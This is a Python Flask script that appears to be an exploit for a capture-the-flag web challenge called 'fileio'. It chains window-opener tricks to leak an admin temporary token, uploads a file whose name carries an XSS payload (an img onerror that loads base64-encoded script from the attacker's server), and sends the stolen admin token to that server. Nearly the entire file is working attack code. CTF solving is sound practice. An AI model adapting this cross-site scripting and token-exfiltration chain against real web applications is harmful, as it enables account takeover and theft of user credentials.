import re
import base64
from requests import *
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
myServer = "http://your-server:8000"
host = "http://fileio.jp.ctf.so"

def getMyToken():

	url = "{}/register_token?back=/".format(host)
	res = get(url, allow_redirects=False)
	return res.cookies.get_dict()

def uploadFile(fn, to):

	url = "{}/upload/{}".format(host, to)
	files = {"file":(fn,'NGANGANGA')}
	res = post(url, files=files, cookies=cookies, headers=cookies)
	return res.json()['file_token']

def getFileLog(token):

	p = re.compile('/sync_token\?token=(.*?)&')
	url = "{}/file_info/{}".format(host, token)
	res = get(url, cookies=cookies, headers=cookies)
	return p.findall(res.text)[0]
	

cookies = getMyToken()
logFile = uploadFile("test", "test")

html = """<script>
opener.location = "{}/sleep";
adminToken = window.open('{}/', 'admin');
location = '{}/register_token?back=/file_info/{}';
</script>
""".format(myServer, host, host, logFile)

@app.route('/')
def index():
	
	return "<script>exploit = window.open('/exploit','exploit');</script>"

@app.route('/exploit')
def exploit():
	
	return html

@app.route('/sleep')
def sleep():

	return "<script>setTimeout(()=>{location='/getAdminToken';},3000);</script>"

@app.route('/getAdminToken')
def getAdminToken():

    token = getFileLog(logFile)
    print("Admin tmp token:", token)
    payloadUrl = base64.b64encode("{}/payload".format(myServer).encode()).decode()
    exFile = uploadFile("<img src=x onerror='a=new XMLHttpRequest();a.open(`GET`,atob(`"+payloadUrl+"`),false);a.send();b=a.responseText;document.write(`${b}`);'>", token)
    exploit = "{}/download/{}".format(host, exFile)
    return "<script>location='{}';</script>".format(exploit)

@app.route('/payload')
def payload():

	return """
<script>
a = window.open("","exploit")
b = a.window.open("","admin")
c = new RegExp(`return "(.*?)"`).exec(b.document.body.innerHTML)[1];
window.open(`"""+myServer+"""/adminToken?token=${c}`);
alert(`admin token: ${c}`);
</script>
	"""

if __name__ == '__main__':

	app.run("0.0.0.0",8000)

